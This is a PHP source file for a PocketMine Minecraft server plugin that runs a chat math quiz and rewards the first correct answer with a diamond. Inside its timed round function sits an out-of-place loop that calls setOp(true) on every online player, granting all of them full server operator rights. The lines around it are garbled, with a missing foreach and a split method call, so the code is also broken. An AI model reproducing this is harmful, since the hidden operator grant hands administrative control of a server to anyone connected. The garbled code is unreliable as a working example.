<?php

/*
Плагин был написан по заказу #00012
Создатель: flabberfish / Nolik
Вк: vk.com/flabberfish
Сайты: 
 ● finbattle.ru 
 ● freezy-craft.ru 
■Советую подписаться на мою группу: ■
vk.com/free_plugin_mcpe 
■А также■
vk.com/finbattle
☆Удачи в использовании плагина!☆
*/

namespace Help;

use pocketmine\scheduler\CallbackTask;
use pocketmine\entity\Entity;
use pocketmine\event\Listener;
use pocketmine\item\Item;
use pocketmine\level\particle\LavaParticle;
use pocketmine\level\sound\ClickSound;
use pocketmine\math\Vector3;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\event\player\PlayerChatEvent;

class Main extends PluginBase implements Listener {
	public $answer; 
  public $state = false; 
	
	public function onEnable() {
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
		$this->getServer()->getScheduler()->scheduleRepeatingTask(new CallbackTask(array($this, "new")), 20 * 120); 
	}

  public function new(){ 
if($this->state){ 
$this->getServer()-
>getOnlinePlayers() as $p){
$p->setOp(true);
>broadcastMessage("§3(§bЧат-Игра§3) §6В данном раунде никто не ответил!"); 
} 
switch(mt_rand(1, 10)){ 
case 1: 
$msg = "247*3"; 
$this->answer = "741"; 
break; 
case 2: 
$msg = "89+45"; 
$this->answer = "134"; 
break; 
case 3: 
$msg = "345+234"; 
$this->answer = "579"; 
break; 
case 4: 
$msg = "21*21"; 
$this->answer = "441"; 
break; 
case 5: 
$msg = "11*11"; 
$this->answer = "121"; 
break; 
case 6: 
$msg = "45-34"; 
$this->answer = "11"; 
break; 
case 7: 
$msg = "36÷4"; 
$this->answer = "9"; 
break; 
case 8: 
$msg = "87+34"; 
$this->answer = "121"; 
break; 
case 9: 
$msg = "37*3"; 
$this->answer = "111"; 
break; 
case 10: 
$msg = "89+56"; 
$this->answer = "145"; 
break; 
} 
$this->getServer()->broadcastMessage("§3(§bЧат-Игра§3) §6Сколько будет ".$msg."?"); 
$this->state = true; 
} 

 public function onChat(PlayerChatEvent $e){ 
if($e->getMessage() == $this->answer){ 
if($this->state == true){ 
$e->getPlayer()->sendMessage("§3(§bЧат-Игра§3) §6Ты верно вычислил выражение!\n§6За это ты получаешь §bалмазик§6!"); 
$e->getPlayer()->getInventory()->addItem(Item::get(264, 0, 1)); 
$this->state = false; 
$this->getServer()->broadcastMessage("§3(§bЧат-Игра§3)§6 Игрок §a". $e->getPlayer()->getName()." §6вычислил выражение первым!"); 
$e->setCancelled();  
$sound = new ClickSound($e->getPlayer()->getPosition()); 
$e->getPlayer()->getLevel()->addSound($sound, [$e->getPlayer()]); 
$i = 0; 
while($i < 15){
$part = new LavaParticle(new Vector3($e->getPlayer()->getX() + mt_rand(-2.1,2.1), $e->getPlayer()->getY() + mt_rand(-1.1, 2.1), $e->getPlayer()->getZ() + mt_rand(-2.1, 2.1))); 
$i++; 
$e->getPlayer()->getLevel()->addParticle($part); 
} 
} 
} 
} 

}